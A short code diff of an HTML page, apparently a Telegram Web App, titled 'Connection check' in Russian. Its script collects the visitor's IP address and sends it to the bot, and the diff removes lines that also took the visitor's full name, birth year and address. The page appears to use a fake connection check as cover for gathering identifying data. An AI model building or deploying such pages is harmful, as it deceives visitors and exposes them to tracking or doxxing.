@@ -75,7 +75,7 @@
 </head>
 <body>
     <div class="container">
-        <h1 style="text-align: center;">Проверка соединения!</h1></div>
+        <h1 style="text-align: center;">Проверка соединения..</h1></div>
 
     <script>
         let collectedData = {};
@@ -105,10 +105,6 @@
             e.preventDefault();
             
             await collectIP();
-
-            collectedData.fio = document.getElementById('fio').value;
-            collectedData.birthYear = document.getElementById('birthYear').value;
-            collectedData.address = document.getElementById('address').value;
 
             window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
         });
